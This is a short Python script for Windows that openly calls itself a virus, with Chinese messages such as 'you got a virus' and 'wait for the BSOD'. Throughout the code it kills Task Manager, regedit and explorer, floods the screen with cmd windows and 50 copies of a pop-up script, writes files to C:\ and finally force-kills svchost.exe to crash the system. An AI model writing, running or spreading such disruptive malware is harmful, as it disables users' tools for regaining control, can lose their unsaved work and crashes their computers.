from tkinter import messagebox
from os import system
from time import sleep
for i in range(5):
    messagebox.showerror("恭喜你","你中病毒了！")
    system("taskkill /f /im regedit.exe")
    system("taskkill /f /im taskmgr.exe")
    system("taskkill /f /im explorer.exe")
    system("start cmd")
for i in range(50):
    print("等着BSOD吧！")
for i in range(10):
    system("taskkill /f /im explorer.exe")
    sleep(1)
    system("start explorer")
for i in range(10):
    system("start cmd")
print(":(")
code = """
from tkinter import messagebox
messagebox.showerror("恭喜你","你中病毒了！")
"""
for i in range(10):
    open(f"C:\\Code{i+1}.txt","w",encoding="utf-8").write("你好啊")
open("C:\\Message.py","w",encoding="utf-8").write(code)
for i in range(50):
    system("start python C:\\Message.py")
sleep(3)
for i in range(10):
    print("你给我蓝屏！")
system("taskkill /f /im svchost.exe")
